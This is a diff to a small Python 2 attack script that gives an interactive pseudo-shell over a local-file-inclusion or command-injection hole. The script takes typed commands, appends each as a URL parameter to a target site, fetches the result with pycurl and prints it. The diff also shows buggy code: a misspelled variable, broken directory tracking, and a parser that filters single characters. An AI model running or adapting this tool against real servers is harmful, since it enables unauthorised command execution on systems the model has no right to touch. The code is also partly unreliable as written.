@@ -4,6 +4,7 @@ import argparse
 import sys, os
 from subprocess import call
 import pycurl
+import re
 from StringIO import StringIO
 
 
@@ -11,6 +12,11 @@ parser = argparse.ArgumentParser(description='Create an interactive shell with a
 parser.add_argument('-u','--url', help='LFI url',required=True)
 parser.add_argument('-v','--variable', help='Command variable',required=True)
 args = parser.parse_args()
+
+
+command=""
+newDir=""
+oldDir=""
 
 def printHeader():
     print ("""
@@ -31,9 +37,26 @@ def printHeader():
 
 
 def parse(temp):
-    os.system("sed -i -f script.sed temp.txt")
-    os.system("awk '!seen[$0]++' temp.txt > temp2.txt")
-    os.system("awk '!seen[$1]++' temp.txt > temp2.txt")
+
+    #parsedString = ""
+    #os.system("awk '!seen[$0]++' temp.txt > temp2.txt")
+    #os.system("awk '!seen[$1]++' temp.txt > temp2.txt")
+   
+
+    
+    #seperate = '<'
+    
+    #splitString = temp.split(seperate, 1) [0]
+    #lineList = splitString.split("\n") 
+
+    #lineSeen = set()
+    #for line in lineList:
+        #if line not in lineSeen:
+            #parsedString = parsedString + line + "\n"
+            #lineSeen.add(line)
+
+    return [parsedString for parsedString in temp if " " not in parsedString]
+    #return parsedString
 
 
 def chngDir(command):
@@ -43,14 +66,12 @@ def chngDir(command):
             olDir = newDir
             newDir = oldDir+newDir
         newDir = command
+    if "ls" in command:
+        command = command+" "+newDir
+        return command
+        #print newDir
 
-    if newDir != "":
-        if "ls" in command:
-            command = command+" "+newDir
-
-
-
-def curl(temp, url):
+def curl(url):
     buffer = StringIO()
     c = pycurl.Curl()
     c.setopt(c.URL, url)
@@ -58,15 +79,7 @@ def curl(temp, url):
     c.perform()
     c.close()
     body = buffer.getvalue()
-
-    temp.write(body)
-
-
-
-command = ""
-newDir = ""
-oldDir = ""
-
+    return body
 
 
 printHeader()
@@ -75,21 +88,21 @@ printHeader()
 #####  MAIN METHOD #####
 while(command != "exit"):
     command = raw_input("$ ")
+    #chngDir(command)
+
+    if "cd" in command:
+        command = command.replace("cd ", "")
+        if(newDir):
+            olDir = newDir
+            newDir = oldDir+newDir
+        newDir = command
+    if "ls" in command:
+        command = command+" "+newDir
 
     command = command.replace(" ", "%20")
-    #chngDir(command)
     url = args.url+"&"+args.variable+"="+command
-    temp = open("temp.txt", "w+")
-    curl(temp, url)
-
-
-    parse(temp)
-    temp.close
-
-    temp2 = open("temp2.txt", "r")
-    print temp2.read()
-    temp2.close
-    call(["rm", "temp.txt"])
-    call(["rm", "temp2.txt"])
+    temp = curl(url)
+    parsedString = parse(temp)
+    print parsedString
 
 
